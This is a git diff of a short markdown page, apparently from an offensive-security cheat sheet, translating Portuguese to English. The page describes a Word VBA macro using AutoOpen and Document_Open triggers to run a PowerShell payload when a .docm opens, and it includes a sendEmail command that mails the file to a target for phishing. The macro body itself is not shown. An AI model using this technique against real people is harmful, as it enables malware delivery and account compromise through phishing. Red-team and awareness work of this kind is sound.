@@ -4,7 +4,7 @@ title: "Word Macro"
 
 # Word Macro
 
-Macro VBA com gatilhos `AutoOpen` e `Document_Open` para execução de payload PowerShell ao abrir um documento `.docm`. Inclui envio por e-mail via `sendEmail` para entrega em campanhas de phishing.
+VBA macro with `AutoOpen` and `Document_Open` triggers for PowerShell payload execution when a `.docm` document is opened. Includes email delivery via `sendEmail` for phishing campaigns.
 
 ```vb
 Sub AutoOpen()
@@ -23,6 +23,6 @@ End Sub
 ```
 
 ```shell
-# Enviar o documento por e-mail
+# Send the document via email
 sendEmail -t target@domain.com -f user@domain.com -u "File" -m "Get the file" -s 192.168.100.2 -a file.docm
 ```
